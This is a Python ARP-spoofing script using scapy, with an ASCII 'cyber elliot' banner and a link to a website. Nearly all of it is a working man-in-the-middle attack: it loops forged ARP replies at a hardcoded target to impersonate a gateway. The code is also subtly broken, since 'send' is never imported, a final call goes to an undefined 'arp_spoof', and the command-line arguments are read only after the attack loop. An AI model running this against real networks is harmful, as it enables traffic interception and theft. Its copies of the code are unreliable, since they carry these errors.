import os
import sys
import time
from scapy.all import ARP, Ether, srp

print ('''
                     █████                       
                    ░░███                        
  ██████  █████ ████ ░███████   ██████  ████████ 
 ███░░███░░███ ░███  ░███░░███ ███░░███░░███░░███
░███ ░░░  ░███ ░███  ░███ ░███░███████  ░███ ░░░ 
░███  ███ ░███ ░███  ░███ ░███░███░░░   ░███     
░░██████  ░░███████  ████████ ░░██████  █████    
 ░░░░░░    ░░░░░███ ░░░░░░░░   ░░░░░░  ░░░░░     
           ███ ░███                              
          ░░██████                               
           ░░░░░░                                
          ████  ████   ███            █████      
         ░░███ ░░███  ░░░            ░░███       
  ██████  ░███  ░███  ████   ██████  ███████     
 ███░░███ ░███  ░███ ░░███  ███░░███░░░███░      
░███████  ░███  ░███  ░███ ░███ ░███  ░███       
░███░░░   ░███  ░███  ░███ ░███ ░███  ░███ ███   
░░██████  █████ █████ █████░░██████   ░░█████    
 ░░░░░░  ░░░░░ ░░░░░ ░░░░░  ░░░░░░     ░░░░░                                                                                    
''')
print ("Don't forget to visit our website to learn more")
print ("https://cyberelliot.com")

# Function to get the target IP and MAC address
def get_mac(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    return result[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=0)

# Set the target IP and spoofed IP
target_ip = "192.168.220.27"
spoof_ip = "192.168.1.1"

# Send the spoofed ARP packet
try:
    while True:
        spoof(target_ip, spoof_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Stopping ARP spoof. Restoring ARP tables...")
    restore(target_ip, spoof_ip)

    
# Get the arguments
target_ip = sys.argv[1]
spoof_ip = sys.argv[2]

# Start the ARP spoofing
arp_spoof(target_ip, spoof_ip)